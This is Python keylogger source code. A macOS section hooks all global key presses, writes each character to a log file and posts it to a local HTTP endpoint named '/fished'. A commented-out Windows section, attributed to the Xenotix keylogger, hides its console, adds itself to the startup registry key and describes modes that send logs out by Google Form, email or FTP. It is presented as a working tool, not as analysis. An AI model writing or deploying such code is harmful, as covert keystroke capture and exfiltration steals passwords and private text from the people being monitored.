from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
import os.path
import requests
import json
lines = []
class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    try:
        response = "{}".format(event)
        chars = response.split("chars=\"")
        c = chars[1][0]
        lines.append('{}'.format(c))
        f = open('log.txt', 'w')
        for l in lines:
            f.write(l)
        f.close()
        stc = '{}'.format(c)        
        d = {"char": stc}
        r = requests.post('http://127.0.0.1:3000/fished', data=d)

    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
    if os.path.isfile('log.txt'):
        fr = open('log.txt','r')
        for l in fr.readlines():
            lines.append(l)
    else:
        lines.append("")
    main()




"""
WINDOWS:
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print \n \nXenotix Python Keylogger for Windows
Coder: Ajin Abraham <ajin25@gmail.com>
OPENSECURITY.IN
usage:xenotix_python_logger.py mode [optional:startup]
mode:
     local: store the logs in a file [keylogs.txt]

     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.

     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).

     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
[optional] startup: This will add the keylogger to windows startup.\n\n
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True
"""
